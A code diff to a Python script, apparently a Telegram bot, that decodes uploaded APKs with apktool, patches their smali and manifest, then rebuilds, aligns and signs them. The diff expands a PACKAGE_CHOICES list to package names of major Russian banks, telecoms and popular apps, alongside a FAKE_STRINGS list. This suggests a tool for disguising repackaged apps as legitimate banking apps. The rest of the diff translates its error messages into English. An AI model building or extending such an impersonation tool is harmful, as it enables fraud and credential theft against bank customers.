@@ -110,7 +110,21 @@ UNSIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-unsigned.apk")
 ALIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-aligned.apk")
 OUTPUT_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game.apk")
 PACKAGE_CHOICES = [
-    "ru.alfabank.mobile.android", 
+    "ru.sberbankmobile",
+    "com.idamob.tinkoff.android",
+    "ru.rostel",
+    "ru.duplex.mobi",
+    "ru.mts.mymts",
+    "ru.mail.cloud",
+    "com.avito.android",
+    "ru.yandex.taxi",
+    "com.vkontakte.android",
+    "ru.ok.android",
+    "ru.alfabank.mobile.android",
+    "ru.vtb24.mobilebanking.android",
+    "ru.megafon.mlk",
+    "ru.mail.mailapp",
+    "ru.ozon.app.android",
 ]
 
 FAKE_STRINGS = [
@@ -360,8 +374,8 @@ def validate_keystore():
         details = combine_process_output(result.stdout, result.stderr).replace(" ", "").lower()
         if "signaturealgorithmname:sha256" not in details:
             raise KeystoreConfigError(
-                "Сертификат keystore должен использовать SHA-256. Пересоздайте его командой "
-                "'keytool -genkey -sigalg SHA256withRSA ...' или отключите "
+                "Keystore certificate must use SHA-256. Recreate it with "
+                "'keytool -genkey -sigalg SHA256withRSA ...' or disable "
                 "REQUIRE_SHA256_KEYSTORE."
             )
 
@@ -576,30 +590,30 @@ def _legacy_build_stage_message(error):
 def build_stage_message(error):
     if error.stage == "decode":
         return (
-            "❌ Не удалось распаковать APK через apktool.\n\n"
-            f"{error.details or 'Проверьте, что файл не повреждён и может быть обработан apktool.'}"
+            "APK decode failed.\n\n"
+            f"{error.details or 'Check that the input APK is valid and can be processed by apktool.'}"
         )
     if error.stage == "build":
         return (
-            "❌ Не удалось пересобрать APK.\n\n"
-            f"{error.details or 'Проверьте изменения smali и манифеста после патчинга.'}"
+            "APK rebuild failed.\n\n"
+            f"{error.details or 'Check smali and manifest changes after patching.'}"
         )
     if error.stage == "zipalign":
         return (
-            "❌ Не удалось выровнять APK через zipalign.\n\n"
-            f"{error.details or 'Проверьте, что zipalign установлен и доступен в PATH.'}"
+            "zipalign failed.\n\n"
+            f"{error.details or 'Check that zipalign is installed and available in PATH.'}"
         )
     if error.stage == "sign":
         return (
-            "❌ Не удалось подписать APK.\n\n"
-            f"{error.details or 'Проверьте конфигурацию keystore и параметры подписи.'}"
+            "APK signing failed.\n\n"
+            f"{error.details or 'Check keystore configuration and signing options.'}"
         )
     if error.stage == "verify":
         return (
-            "❌ Подписанный APK не прошёл проверку apksigner.\n\n"
-            f"{error.details or 'Проверьте SIGN_V1_ENABLED, SIGN_V2_ENABLED, SIGN_V3_ENABLED и SIGN_MIN_SDK_VERSION.'}"
+            "APK verification failed.\n\n"
+            f"{error.details or 'Check SIGN_V1_ENABLED, SIGN_V2_ENABLED, SIGN_V3_ENABLED and SIGN_MIN_SDK_VERSION.'}"
         )
-    return f"❌ Ошибка на этапе '{error.stage}'.\n\n{error.details or 'Без деталей.'}"
+    return f"Error at stage '{error.stage}'.\n\n{error.details or 'No details.'}"
 
 
 @dp.message(F.document)
